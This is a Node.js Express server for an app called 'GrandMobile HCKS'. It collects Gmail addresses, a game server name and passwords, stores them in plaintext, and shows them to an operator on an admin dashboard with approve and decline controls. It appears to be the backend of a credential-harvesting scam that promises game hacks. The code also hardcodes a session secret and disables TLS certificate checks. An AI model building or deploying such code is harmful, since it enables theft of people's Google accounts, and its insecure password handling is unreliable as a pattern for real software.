require("dotenv").config();
const express = require("express");
const session = require("express-session");
const { Pool } = require("pg");
const path = require("path");

const app = express();
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// Change these before deploying.
const ADMIN_USERNAME = process.env.ADMIN_USERNAME;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;

async function initDatabase() {
  await pool.query(`
  CREATE TABLE IF NOT EXISTS submissions (
    id SERIAL PRIMARY KEY,
    gmail_account TEXT NOT NULL,
    server TEXT NOT NULL,
    password TEXT,
     status TEXT NOT NULL DEFAULT 'pending',
    created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
  )
`);
await pool.query(`
    ALTER TABLE submissions
    ADD COLUMN IF NOT EXISTS status TEXT NOT NULL DEFAULT 'pending'
  `);

console.log("PostgreSQL database ready.");
}

initDatabase().catch((err) => {
  console.error("Database initialization failed:", err);
  process.exit(1);
});

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({
  secret: "replace-this-with-a-long-random-secret",
  resave: false,
  saveUninitialized: false,
  cookie: { httpOnly: true, sameSite: "lax" }
}));
app.use(express.static(path.join(__dirname, "public")));

function requireAdmin(req, res, next) {
  if (!req.session.admin) return res.status(401).json({ error: "Admin access required." });
  next();
}
app.post("/api/submit", async (req, res) => {
  const { gmail_account, server, password } = req.body;

  if (!gmail_account || !server) {
    return res.status(400).json({
      error: "Gmail account and server are required."
    });
  }

  try {
    const result = await pool.query(
      `INSERT INTO submissions
       (gmail_account, server, password, status)
       VALUES ($1, $2, $3, 'pending')
       RETURNING id`,
      [
        String(gmail_account).trim(),
        String(server).trim(),
        String(password || "").trim()
      ]
    );

    res.json({
      ok: true,
      id: result.rows[0].id
    });
  } catch (err) {
    console.error("Error inserting submission:", err);
    res.status(500).json({
      error: "Internal server error."
    });
  }
});

app.post("/api/admin/login", (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    req.session.admin = true;
    return res.json({ ok: true });
  }
  res.status(401).json({ error: "Invalid admin login." });
});

app.post("/api/admin/logout", (req, res) => {
  req.session.destroy(() => res.json({ ok: true }));
});

app.get("/api/admin/submissions", requireAdmin, (req, res) => {
  pool.query(`
    SELECT id, gmail_account, server, password, created_at, status
    FROM submissions ORDER BY id DESC
  `).then((result) => {
    res.json(result.rows);
  }).catch((err) => {
    console.error("Error fetching submissions:", err);
    res.status(500).json({ error: "Internal server error." });
  });
});

app.delete("/api/admin/submissions/:id", requireAdmin, (req, res) => {
  pool.query("DELETE FROM submissions WHERE id = $1", [req.params.id]).then(() => {
    res.json({ ok: true });
  }).catch((err) => {
    console.error("Error deleting submission:", err);
    res.status(500).json({ error: "Internal server error." });
  });
});
app.get("/api/status/:id", async (req, res) => {
  try {
    const result = await pool.query(
      "SELECT status FROM submissions WHERE id = $1",
      [req.params.id]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({
        status: "not_found"
      });
    }

    res.json({
      status: result.rows[0].status
    });
  } catch (err) {
    console.error("Error checking status:", err);
    res.status(500).json({
      error: "Internal server error."
    });
  }
});
app.get("/api/admin/me", (req, res) => {
  res.json({ admin: !!req.session.admin });
});

app.listen(3000, () => {
  console.log("GrandMobile HCKS running at http://localhost:3000");
  console.log("Admin dashboard: http://localhost:3000/admin.html");
});
app.post("/api/admin/submissions/:id/approve", requireAdmin, async (req, res) => {
  try {
    await pool.query(
      "UPDATE submissions SET status = 'approved' WHERE id = $1",
      [req.params.id]
    );

    res.json({ ok: true });
  } catch (err) {
    console.error("Error approving submission:", err);
    res.status(500).json({ error: "Internal server error." });
  }
});
app.post("/api/admin/submissions/:id/decline", requireAdmin, async (req, res) => {
  try {
    await pool.query(
      "UPDATE submissions SET status = 'declined' WHERE id = $1",
      [req.params.id]
    );

    res.json({ ok: true });
  } catch (err) {
    console.error("Error declining submission:", err);
    res.status(500).json({ error: "Internal server error." });
  }
});